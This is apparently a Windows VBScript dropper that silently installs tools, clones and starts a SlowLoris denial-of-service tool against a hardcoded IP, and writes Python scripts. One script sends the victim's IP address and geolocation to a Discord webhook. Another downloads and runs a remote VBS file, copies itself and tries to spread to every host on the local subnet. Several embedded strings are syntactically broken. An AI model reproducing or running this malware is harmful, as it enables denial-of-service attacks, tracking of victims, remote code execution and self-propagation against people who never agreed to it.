Set shell = CreateObject("WScript.Shell")
exitCode = shell.Run("winget install --id Git.Git -e --source winget", 0, False)
 
Set shell = CreateObject("WScript.Shell")
exitCode = shell.Run("Git clone https://github.com/randyman777777777/thesillyzone.git", 0, True)

Set shell = CreateObject("WScript.Shell")
exitCode = shell.Run("cd thesillyzone", 0, False)
 
Set shell = CreateObject("WScript.Shell")
exitCode = shell.Run("start r.py", 0, False)
 
Set shell = CreateObject("WScript.Shell")
exitCode = shell.Run("winget install pip", 0, True)
 
Set shell = CreateObject("WScript.Shell")
exitCode = shell.Run("pip install dhooks", 0, True)
 
Set shell = CreateObject("WScript.Shell")
exitCode = shell.Run("Git clone https://github.com/StanGirard/SlowLoris-DDOS-Attack.git", 0, True)
 
Set shell = CreateObject("WScript.Shell")
exitCode = shell.Run("cd SlowLoris-DDOS-Attack", 0, False)
 
Set shell = CreateObject("WScript.Shell")
exitCode = shell.Run("pip install certifi", 0, False)
 
Set shell = CreateObject("WScript.Shell")
exitCode = shell.Run("pip install chardet", 0, False)
 
Set shell = CreateObject("WScript.Shell")
exitCode = shell.Run("pip install idna", 0, False)
 
Set shell = CreateObject("WScript.Shell")
exitCode = shell.Run("pip install requests", 0, False)
 
Set shell = CreateObject("WScript.Shell")
exitCode = shell.Run("pip install urllib3", 0, False)
 
Set shell = CreateObject("WScript.Shell")
exitCode = shell.Run("python src/main.py -a 104.26.3.0 -s 1000", 0, False)

' Create the file
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.CreateTextFile("C:\woops.py", True)

' Write the program to the file
file.WriteLine "import requests
from dhooks import Webhook, Embed
from datetime import datetime

hook = Webhook("https://discord.com/api/webhooks/1065493281972174879/55OJnwDxbApdqeAMiF5BjfTddA91PgdrdFdxmSB5evEH2it_JGiytKgotAa7PU0o-j3F")

time = datetime.now().strftime("%H:%M %p")  
ip = requests.get('https://api.ipify.org/').text

r = requests.get(f'http://extreme-ip-lookup.com/json/{ip}')
geo = r.json()
embed = Embed()
fields = [
    {'name': 'IP', 'value': geo['query']},
    {'name': 'ipType', 'value': geo['ipType']},
    {'name': 'Country', 'value': geo['country']},
    {'name': 'City', 'value': geo['city']},
    {'name': 'Continent', 'value': geo['continent']},
    {'name': 'Country', 'value': geo['country']},
    {'name': 'IPName', 'value': geo['ipName']},
    {'name': 'ISP', 'value': geo['isp']},
    {'name': 'Latitute', 'value': geo['lat']},
    {'name': 'Longitude', 'value': geo['lon']},
    {'name': 'Org', 'value': geo['org']},
    {'name': 'Region', 'value': geo['region']},
    {'name': 'Status', 'value': geo['status']},
]
for field in fields:
    if field['value']:
        embed.add_field(name=field['name'], value=field['value'], inline=True)
hook.send(embed=embed)"
file.Close

' Run the program
Set shell = CreateObject("WScript.Shell")
shell.Run "python C:\woops.py"

' Create the primary file
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.CreateTextFile("C:\deeeep.py", True)

' Write the program to the file
file.WriteLine "import requests
import json
from dhooks import Webhook, Embed
from datetime import datetime

hook = Webhook("import socket
import os
import requests
import subprocess
import random
import string
 
url = "https://litter.catbox.moe/9uer99.vbs"
        # https://pastebin.com/jctfy1m1
 
r = requests.get(url)
 
with open("9uer99.vbs", 'wb') as f:
 
    f.write(r.content) 
 
command1 = ""f'start 9uer99.vbs'""
os.system(command1)
 
# Get the current file's path
file_path = os.path.abspath(__file__)
 
# Open the file
with open(file_path, 'rb') as f:
    file_data = f.read()
 
# Generate a random string for the file name
file_name = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10)) + ".py"
 
# Get the path of the copied file
copied_file_path = os.path.join("C:\\plrg", file_name)
 
# Check if the directory exists, create it if it doesn't
if not os.path.exists(os.path.dirname(copied_file_path)):
    os.makedirs(os.path.dirname(copied_file_path))
 
# Save the received data to the new file
with open(copied_file_path, "wb") as f:
    f.write(file_data)
 
# Open the copied file using the appropriate command
subprocess.run(["start", copied_file_path], shell=True)
 
# Get the local IP address
ip = socket.gethostbyname(socket.gethostname())
 
# Get the subnet
subnet = '.'.join(ip.split('.')[:-1]) + '.'
 
# Iterate through all IP addresses in the subnet
for i in range(1, 256):
    try:
        # Create a socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect to the IP address
        s.connect((subnet + str(i), 1337))
        # Send the file data
        s.sendall(file_data)
        # Save the received data to a new file
        with open(copied_file_path, "wb") as f:
            f.write(file_data)
        # Close the socket
        s.close()
    except:
        # If the connection fails, move on to the next IP
        pass")
shell.Run "python C:\deeeep.py"